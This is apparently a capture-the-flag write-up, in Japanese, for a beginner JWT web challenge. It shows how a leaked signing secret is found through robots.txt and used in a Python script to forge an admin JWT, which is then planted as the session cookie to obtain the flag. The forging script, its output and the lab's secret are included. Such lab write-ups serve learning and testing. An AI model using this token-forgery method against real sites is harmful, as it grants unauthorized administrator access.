# JWT Learning - Web
JWTs (JSON Web Tokens) are created at login and used by backends to efficiently verify certain things (claims) about the authenticated user.
Usually these cannot be tampered with because they are cryptographically signed.
Let's learn a little about JWTs and tamper with one in a badly-written web app.
This challenge will walk you through each step.
https://beginner-jwt-learning-974780027560.us-east5.run.app

## solve

ページに沿って進んでいく

JWTが書かれている
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhbSIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3Mzg4ODc2OTQsImV4cCI6MTczODg4OTQ5NH0.KrRwMea_fXtfp-IbvFCn3Q-HiNVMitips0SVxODfGJc
```


`isAdmi:true`に変える
![](image.png)


`sam`を入力して進む
![](image-3.png)


/robots.txにアクセスするよう指示される
/TOKEN_SECRET.txtにアクセス出来そう


![](image-1.png)


/TOKEN_SECRET.txtにアクセスと秘密鍵が書かれている

![](image-4.png)

TOKEN_SECRET.txtを使って新しいJWT作成する
- isAdmin:trueにしただけでは有効期限がだめらしいので期限も設定する

新しいJWT作成(true、有効時間)
```
import jwt
import datetime

# 秘密鍵（TOKEN_SECRET.txt の内容）
secret = "fa43623fc456bf3a62ea923f4e7a009f0aeec4a0032670ed6fc90bd268e4c62c896699572b914cb15806695fcb1f6eb3141c9bc86a87cca1bda98e1429aa902b"

# JWTペイロード（有効期限を24時間に延長）
payload = {
    "username": "sam",
    "isAdmin": True,
    "iat": int(datetime.datetime.utcnow().timestamp()),  # 現在時刻
    "exp": int((datetime.datetime.utcnow() + datetime.timedelta(hours=24)).timestamp())  # 24時間後
}

# JWTの生成
new_token = jwt.encode(payload, secret, algorithm="HS256")

print("New JWT:", new_token)
```

出力
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhbSIsImlzQWRtaW4iOnRydWUsImlhdCI6MTc0MjY2ODQyOSwiZXhwIjoxNzQyNzU0ODI5fQ.etI9HP-Yw6nlqCJUAOFebfPkEjrxlFrIXcgFsl5MV6U
```


デベロッパーツール > アプリケーション > Cookie > 値を新しいJWTに書き換える

![](image-2.png)


## flag
`wctf{jw7_l34rn1n6_15_fun_135624154}`